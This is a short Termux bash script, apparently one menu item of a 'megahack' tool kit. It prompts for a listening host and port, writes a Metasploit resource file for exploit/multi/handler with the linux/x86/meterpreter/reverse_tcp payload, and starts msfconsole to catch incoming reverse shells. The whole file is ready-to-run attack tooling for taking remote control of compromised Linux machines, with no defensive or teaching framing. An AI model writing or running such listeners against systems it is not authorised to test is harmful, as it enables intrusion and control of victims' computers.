#!/data/data/com.termux/files/usr/bin/bash
rm -rf .d.rc
clear
cd $HOME/megahack
figlet LINUX | lolcat -t
figlet LISTNER | lolcat -t
echo " "
tput setaf 1; echo " LHOST"
read lhost
tput setaf 2; echo " LPORT"
read lport
echo "use exploit/multi/handler" > .d.rc
echo "set lhost $lhost" >> .d.rc
echo "set lport $lport " >> .d.rc
echo "set payload linux/x86/meterpreter/reverse_tcp " >> .d.rc
echo "exploit" >> .d.rc
echo " "
msfconsole -r .d.rc
cd $HOME/megahack && bash megahack




